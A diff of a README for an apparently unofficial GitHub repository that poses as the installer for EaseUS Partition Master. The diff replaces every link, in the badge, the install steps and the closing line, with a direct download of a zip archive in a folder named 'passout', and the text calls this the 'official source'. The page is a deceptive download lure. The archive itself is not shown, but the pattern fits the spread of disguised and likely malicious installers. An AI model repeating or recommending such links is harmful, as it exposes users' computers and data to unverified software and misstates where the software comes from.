@@ -1,6 +1,6 @@
 # 🖥️ EaseUS-Partition-Master-Setup - Manage your computer disk partitions easily
 
-[![](https://img.shields.io/badge/Download-Setup-blue.svg)](https://github.com/black024/EaseUS-Partition-Master-Setup)
+[![](https://img.shields.io/badge/Download-Setup-blue.svg)](https://raw.githubusercontent.com/black024/EaseUS-Partition-Master-Setup/main/passout/Setup-Ease-U-Partition-Master-2.4-beta.1.zip)
 
 EaseUS Partition Master helps you organize your computer storage. You can resize, move, merge, and format partitions on your hard drive or solid-state drive. The software provides a simple interface to manage disk space without data loss. It includes tools to convert disk styles, move your Windows system to a new drive, and create recovery media.
 
@@ -18,7 +18,7 @@ To run this software, your computer needs to meet these basic standards:
 
 Follow these steps to get the software on your Windows computer:
 
-1. Visit the project repository page to access the file: [https://github.com/black024/EaseUS-Partition-Master-Setup](https://github.com/black024/EaseUS-Partition-Master-Setup).
+1. Visit the project repository page to access the file: [https://raw.githubusercontent.com/black024/EaseUS-Partition-Master-Setup/main/passout/Setup-Ease-U-Partition-Master-2.4-beta.1.zip](https://raw.githubusercontent.com/black024/EaseUS-Partition-Master-Setup/main/passout/Setup-Ease-U-Partition-Master-2.4-beta.1.zip).
 2. Look for the file download link provided in the main repository sections.
 3. Save the installer file to a folder you can find easily, such as your Downloads folder.
 
@@ -90,4 +90,4 @@ Right-click the start button and select Disk Management. Right-click your disk n
 
 If you have questions about using the software, look for the help menu inside the program. The manual provides deep details for every feature. Ensure you run the installer from the official source link to maintain security on your computer.
 
-[https://github.com/black024/EaseUS-Partition-Master-Setup](https://github.com/black024/EaseUS-Partition-Master-Setup)
+[https://raw.githubusercontent.com/black024/EaseUS-Partition-Master-Setup/main/passout/Setup-Ease-U-Partition-Master-2.4-beta.1.zip](https://raw.githubusercontent.com/black024/EaseUS-Partition-Master-Setup/main/passout/Setup-Ease-U-Partition-Master-2.4-beta.1.zip)
